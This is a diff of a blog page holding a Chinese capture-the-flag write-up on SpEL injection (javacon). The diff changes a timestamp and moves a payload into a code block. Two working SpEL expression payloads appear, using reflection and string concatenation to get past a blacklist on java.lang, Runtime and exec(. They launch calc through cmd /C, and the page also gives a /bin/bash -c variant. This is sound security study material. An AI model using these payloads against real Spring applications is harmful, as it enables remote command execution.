@@ -25,7 +25,7 @@
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/17/SpEL注入之javacon/11.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/17/SpEL注入之javacon/6.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/17/SpEL注入之javacon/10.png">
-<meta property="og:updated_time" content="2019-03-23T13:33:53.212Z">
+<meta property="og:updated_time" content="2019-03-23T14:42:25.020Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SpEL注入之javacon">
 <meta name="twitter:description" content="SpEL注入漏洞何为SpEL表达式 Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对象图；语法上类似于 Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL 的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。  SpEL使">
@@ -226,7 +226,9 @@
 <h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>开始网上搜的一大堆SpEL注入exp无法利用，因为这里使用了黑名单过滤了<code>java.lang</code>、<code>Runtime</code>和<code>exec(</code>。</p>
 <p>尝试了使用ProcessBuilder().start()来绕过，但是没利用成功。</p>
 <p>后面参考了<a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">一篇wp</a>，发现可以用Java的反射机制来绕过，具体绕过原理是因为通过反射机制的forName()和getMethod()等方法，其参数是字符串因此可通过字符串拼接的方式来绕过黑名单。</p>
-<h3 id="Windows场景"><a href="#Windows场景" class="headerlink" title="Windows场景"></a>Windows场景</h3><h4 id="本地弹计算器"><a href="#本地弹计算器" class="headerlink" title="本地弹计算器"></a>本地弹计算器</h4><p>常见的payload为<code>String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;});</code>，但是这里需要改为SpEl的解析格式以满足Spring的解析条件，主要就是改一个T() 。在SpEL中，使用T()运算符会调用类作用域的方法和常量。</p>
+<h3 id="Windows场景"><a href="#Windows场景" class="headerlink" title="Windows场景"></a>Windows场景</h3><h4 id="本地弹计算器"><a href="#本地弹计算器" class="headerlink" title="本地弹计算器"></a>本地弹计算器</h4><p>常见的payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName(<span class="string">"java.l"</span>+<span class="string">"ang.Ru"</span>+<span class="string">"ntime"</span>).getMethod(<span class="string">"exec"</span>,String.class).invoke(String.class.getClass().forName(<span class="string">"java.l"</span>+<span class="string">"ang.Ru"</span>+<span class="string">"ntime"</span>).getMethod(<span class="string">"getRu"</span>+<span class="string">"ntime"</span>).invoke(String.class.getClass().forName(<span class="string">"java.l"</span>+<span class="string">"ang.Ru"</span>+<span class="string">"ntime"</span>)),<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>,<span class="string">"calc"</span>&#125;);</span><br></pre></td></tr></table></figure>
+<p>但是这里需要改为SpEl的解析格式以满足Spring的解析条件，主要就是改一个T() 。在SpEL中，使用T()运算符会调用类作用域的方法和常量。</p>
 <p>注意，以<code>new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;xx&quot;}</code>这种形式定义命令是为了满足Linux下复杂命令构造的条件，通用。当然Linux下应该写为<code>new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;xxxxx&quot;}</code>。</p>
 <p>payload如下：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","calc"&#125;)&#125;</span><br></pre></td></tr></table></figure>
